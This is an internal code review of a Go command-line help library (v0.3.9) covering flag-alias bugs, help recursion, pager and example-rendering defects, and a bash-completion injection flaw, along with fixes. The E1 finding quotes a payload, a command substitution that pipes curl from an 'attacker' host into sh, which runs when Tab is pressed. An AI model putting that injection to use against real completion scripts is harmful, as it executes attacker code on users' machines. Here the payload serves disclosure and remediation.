# Deep code review — 2026-09-17 (v0.3.9)

> **Reading this later.** Items below struck through have since been settled; the note
> after each says how. The current state of the public API is
> `review/api-surface-2026-09-18.md`, and `docs/how-clihelp-decides.md` is the
> mechanism this library actually implements today.

Evidence-based review of the whole library for correctness defects. Five parallel
dimension reviews (flag binding, command resolution and lifecycle, shell completion,
rendering and output, examples and doc generation), followed by independent
verification of every critical and high finding.

**Method.** Every "verified" finding below was reproduced from an external consumer
module (`replace github.com/sarielhp/clihelp => .`), exercising only the exported API,
at commit `1719d18`. No project binary was executed: `example/main.go` sets
`AutoInstallCompletion: true`, so running it writes a completion script into the real
user's config directory. `make check` was green before and after the review; no
repository file was modified during it.

**Why the test suite did not catch any of this.** The library's own examples use only
one long plus one short flag name per option, and none of them declares an alias,
a deprecated short-only option, or an example line containing `help`. Meanwhile
`docs/flags-and-options.md:27` advertises `"-p, -P, --port, --listen-port <num>"` —
a shape that breaks required-flag detection, `StringSlice` accumulation, and the
relation validators.

---

## Five root causes

Most findings are symptoms of five defects. Fixing the cause fixes the cluster.

| Chain | Root cause | Symptoms |
|---|---|---|
| **A** | `resolveCommandPath` *renders* help instead of reporting that help was requested | A1 stack overflow, A2 help injected into the completion stream, A3 help leaked from `Audit`/`ValidateExamples` |
| **B** | `bindHelper` registers each alias name as a *separate* pflag flag sharing one target variable | B1 required flags falsely missing, B2 `StringSlice` value loss, B3 validators blind to aliases, B4 missed deprecation warnings — **fixed: 8893f79** |
| **C** | the flag-spec mini-language has no validator, and `Audit` never inspects app-level options | C1 multi-char shorthand panic, C2 dash-less spec binds nothing, C3 `BoolToggle` empty-name panic, C4 `BoolToggle` alias long names dropped — **fixed: 8893f79** |
| **D** | binders write defaults through the consumer's pointer, and three paths bind without parsing | D1 live variables reset by resolution (v0.3.9 regression), D2 by `ValidateExamples`, D3 by `Audit` — **fixed: `e1c38ad`, `3dbca4d`** |
| **E** | completion output is unescaped and the generated bash script re-expands it | E1 code execution at Tab-press, E2 zsh word re-evaluation |

## Critical

### A1 — Help rendering recurses until the process dies  **[fixed: 9ad2d4d]**

`execute.go:604-608`. `resolveCommandPath` is not a pure resolver: on a help token it
calls `handleHelpInvocation`, which renders to `a.stdout()`. Example colorization
(`examples.go:159`) calls `resolveCommand` for every example line *while rendering help*.

An `Example{Line: "app help"}` therefore makes `RenderGlobal` → colorize → resolve →
`RenderGlobal` → … until `fatal error: stack overflow`. The process dies; there is no
recover. Reachable from `app`, `app --help`, `app <cmd> -h`, `RenderGlobal`,
`RenderCommand`, `ValidateAllExamples` and `Audit`. **Verified.**

**Fix.** Make resolution pure: add `isHelp bool` / `helpPath []string` to `resolution`
and move the single `handleHelpInvocation` call into `ExecuteContext`. All identifiers
are unexported, so the API is unchanged. This also fixes A2 and A3.

### E1 — Arbitrary code execution through the generated bash completion  **[fixed: 01d3bed]**

`completion.go:223-226`. `handleComplete` writes `name\tdescription\n` with no
sanitization (`completion.go:22,60,94,97,115,121,135,138,156` — there is no escaping in
the file except the zsh colon substitution at `:272-273`). A newline in a `Description`,
or in any `Option.Complete` callback result, forges an extra protocol line. The generated
script then evaluates the candidate list:

```bash
COMPREPLY=( $(compgen -W "${comps[*]}" -- "$cur") )
```

`compgen -W` performs brace, tilde, parameter, **command** and arithmetic expansion on
its word list, and the unquoted `$(...)` adds word splitting and globbing. A description
of `"ship it\n$(curl attacker|sh)"` executes at Tab-press with nothing shown to the user.

The realistic vector is not a hostile description but a `Complete` callback returning
names from a filesystem or a server — branch names, object keys, file names.

**Verified** at the protocol level (emitted stream reproduced) and by reading the
template. The reviewing agent additionally proved it end to end in an interactive bash
under a pty: pressing Tab created the payload file while the terminal displayed only the
legitimate candidates.

**Fix, two layers.** (a) Sanitize: strip `\n`, `\r`, `\t` from every field written by
`handleComplete`, restoring the one-record-per-line invariant. (b) Stop expanding
candidates: replace the `for line in $out` / `compgen -W` block with
`while IFS= read -r` + `COMPREPLY+=( "$c" )` guarded by a `[[ $c == "$cur"* ]]` prefix
test. Layer (b) is the actual defence.

**Ordering hazard.** Neither layer reaches a user who already has a script installed:
`maybeAutoInstallCompletion` only writes when no file exists (`completion.go:387`). The
fix must ship with a version marker in the template that forces a rewrite, or users stay
exposed indefinitely.

## High

### B1 — A required flag set through an alias is reported missing  **[fixed: 8893f79]**

`interactive.go:13-31` checks only `spec.longNames[0]` (or `"flag-"+shortNames[0]`), but
`bindHelper` (`options.go:109-121`) registers every other name as its own pflag flag with
its own `Changed` bit. With `Required(String(&n, "--name, --title, -n, -t", ...))`:

```
--name x  → ok            -n x → ok
--title x → required flag(s) "name" not set   (and the target *was* set to "x")
-t x      → required flag(s) "name" not set
```

A required `BoolToggle` invoked as `--no-color` fails the same way. With
`InteractiveFallback` the user is re-prompted for a flag they just supplied. **Verified.**

### B2 — `StringSlice` silently discards values across alias names  **[fixed: 8893f79]**

`options.go:332-342` with `options.go:109-121`: each registered name gets its own
`stringSliceValue` with its own "first Set replaces, later Sets append" state, all
writing to one target. With `StringSlice(&tags, "--tag, --tags2, -t, -T", ...)`:

```
--tag a --tag b -T c   → tags = [c]     (a and b lost)
--tag a --tags2 b      → tags = [b]     (a lost)
```

No error, no warning; the program runs on wrong data. **Verified.**

### B3 — Relation validators silently enforce nothing when given a shorthand  **[fixed: 8893f79]**

`validation.go:30-45`. `isFlagSet` resolves names only through `fs.Lookup`, which indexes
long names; a shorthand never resolves and `fs.Changed` returns false with no diagnostic.
`MutuallyExclusive("-a", "-b")` with `-a 1 -b 2` returns `nil`, while the `--alpha/--beta`
form on the same input correctly errors. A declared safety constraint is a no-op.
**Verified.**

### C1 — A multi-character shorthand panics pflag at bind time  **[fixed: 8893f79]**

`options.go:89-93` (and again at `:259-263` in `BoolToggle`) passes every parsed short
name to `pflag.ShorthandLookup`, which panics above one character
(`pflag@v1.0.10/flag.go:389-393`). `parseFlagSpec` (`options.go:65-70`) imposes no length
limit, so a single missing dash is enough:

```go
clihelp.String(&out, "-out <F>", "", "output")   // panic: can not look up shorthand
                                                 // which is more than one ASCII character
```

A non-ASCII shorthand panics identically (`len("é") == 2`). `Audit` does not catch it.
**Verified.**

### C3 — `checkDeprecatedFlags` panics on a short-only deprecated option  **[fixed: 8893f79]**

`execute.go:748` builds `fmt.Sprintf("%s-alias-%s", spec.longNames[0], ...)` without the
emptiness guard that the equivalent code in `bindHelper` has (`options.go:115-118`). An
`Option` with `Flags: "-a, -b"` and a `Deprecated` notice panics with
`index out of range [0] with length 0` as soon as the user sets *any* flag, because
`fs.Visit` iterates all set flags and the alias loop runs before the match test.
**Verified.**

### D1 — v0.3.9 regression: resolution resets the consumer's flag variables  **[fixed: e1c38ad]**

`execute.go:512-522`. `leadingFlagSet` runs the real `Option.Binder`s to learn each flag's
arity, and pflag's `*VarP` functions store the declared default *through the caller's
pointer*. Merely resolving an argument vector therefore overwrites the application's own
variables.

```
RenderCommand on a command that has an Example:  out: "USERVALUE" → "DEFAULT"
__complete <cmd> "":                             out: "USERVALUE" → "DEFAULT"
```

The reachable path in a running program is the ordinary "print usage on bad input" idiom:
`ctx.App.RenderCommand(...)` inside a `Run` → example colorization → `resolveCommand` →
`leadingFlagSet`. Introduced by commit `57dd214`; the previous resolver bound nothing.
**Verified.**

**Fix.** Take arity from the parsed spec rather than from a live flag set: record it on
`Option` (unexported field, set by the typed constructors) and have `scanLeadingFlag`
consult a name→arity map built from `parseFlagSpec`. Resolution then becomes
side-effect-free, and the O(depth) rebuild of the probe disappears.

### Pager failure discards the entire output  **[fixed: 69c41d9]**

`pager.go:56,64-66`. `cmd.Stdin = &buf` is drained by `os/exec`'s copy goroutine as soon
as the child starts, so by the time `cmd.Run()` returns an error `buf.Bytes()` is empty —
the fallback writes nothing. Measured: 0 of 600 bytes survive a failed pager. With
`PAGER=false`, or a quoting mistake such as `PAGER="sh -c 'less -R'"` (`buildPagerArgs`
splits on whitespace, not shell rules), the user gets a blank help screen. For output
larger than the pipe buffer the fallback writes the tail, leaving a ~64 KiB hole.
**Verified.** Non-issues: a missing pager binary fails before any read (full output
survives), and quitting `less` early exits 0, so the fallback never fires.

**Fix.** `cmd.Stdin = bytes.NewReader(data)` and fall back only when the pager wrote
nothing, counted through a small wrapping writer.

### `inline()` rewrites example command lines  **[fixed: 1e30c62]**

`examples.go:106` passes the colorized *command line* through the inline-markdown
renderer, which strips `\`, `*`, `**`, `~~`, backticks and link syntax:

```
myapp run --path C:\temp\x      → myapp run --path C:tempx
myapp cp '*.go' '*.txt' dest/   → asterisks replaced by italic escapes
myapp echo a\ b                 → myapp echo a b
```

The help text shows a command that is not the one the author wrote and not one that
works. **Verified.** Fix: return `b.String()` unchanged; `ex.Description` already gets
its own `inline()` call at `examples.go:257`.

### D2/D3 — `ValidateExamples` and `Audit` clobber live values and leak help  **[fixed: 3dbca4d]**

`examples.go:401-411`. The "static" validator binds every option into a throwaway flag set
and parses the example, writing both the defaults and the example's values through the
consumer's pointers: `verbose=true name="production" count=42` becomes
`verbose=false name="other" count=99`. `Audit` — which `README.md:195-199` recommends
running in CI — does the same, and an example containing `help` additionally writes a
rendered help page into `App.Stdout` during validation. **Verified.**

## Hypotheses that did not survive

Recorded because a disproved hypothesis is a result.

- **Completion templates do not interpolate user text.** All three generators emit static
  templates whose only substitutions are `app.Name` and its cleaned form. The exposure is
  the runtime protocol, not the script text.
- **zsh and fish quoting are correct.** `${(f)"$(...)"}` splits on newlines without
  re-expansion, `_describe` colons are escaped (`completion.go:272-273`), and fish never
  re-evaluates the substitution output. fish's `(commandline -ct)` handles the empty
  trailing token correctly.
- **`scanLeadingFlag` (v0.3.9) is sound.** Differential testing against pflag over every
  argument vector of length ≤ 3 from a 15-symbol alphabet found 0 mismatches; it cannot
  over-run the slice, cannot return `0, true`, and preserves the relative order of every
  retained token. Its defect is D1 — the probe's side effects — not its logic.
- **No unbounded loops in `reflow`, no index panics in `inline.go` or the example
  tokenizer, no negative `strings.Repeat`.** Exercised at widths 1–40 and against 35
  hostile inputs.
- **No remaining package-level mutable state.** The v0.3.8 `color.NoColor` fix holds;
  the only package-level variables are `SupportedShells` and a compiled regexp, and
  rendering never mutates `App`.
- **`doc/md.go` write ordering is safe.** Pages are written before the hash, so a
  mid-write failure leaves the old hash and the next run regenerates. The `git
  check-ignore` subprocess distinguishes a missing git binary from "not ignored".
- **Hidden commands are handled consistently** (exact name only), except for the
  `suggestCommand` leak listed above.
- **`args.go` has no defects.**

## Status

**Every finding in this document is fixed.** Each was first reproduced through the
exported API and each fix ships with a regression test whose teeth were checked
against the unfixed code.

- **0.3.10** — the *Now* block: A1 (`9ad2d4d`), D1 (`e1c38ad`), E1 (`01d3bed`).
- **0.3.11** — the *Next* block: chains C and B and the `Audit` extension they
  depend on (`8893f79`), plus the fuzz target this document asked for
  (`87edf8c`), which found a fourth panic — a spec repeating a shorthand.
- **0.3.12** — the *Later* block and the remaining High findings: the pager
  fallback (`69c41d9`), verbatim example lines (`1e30c62`), D2/D3 (`3dbca4d`),
  shortcut commands and the category-command lifecycle (`120534d`), partial
  resolutions (`a600c5a`), the example scanners (`29e8eed`), display-width layout
  (`eba645c`), doc generation (`6e0ae52`), and completion installation
  (`9c969a9`).

Behavior changes that ship with the fixes, all recorded in `CHANGES.md`: a
relation validator naming a flag the command does not declare is an error rather
than a silent no-op; `Audit` rejects flag collisions between scopes that share one
flag set and examples that omit a required flag; `detectShell` no longer answers
"bash" for a shell it does not recognize.

`InstallCompletion`'s truncate-before-generate ordering, which this document
deliberately left alone for want of a test with teeth, was fixed after all
(`9c969a9`): generating into memory and renaming into place needs no injected
write failure to be worth having, and the tests that do exist cover the outcome —
a complete script, no temporary file left behind.
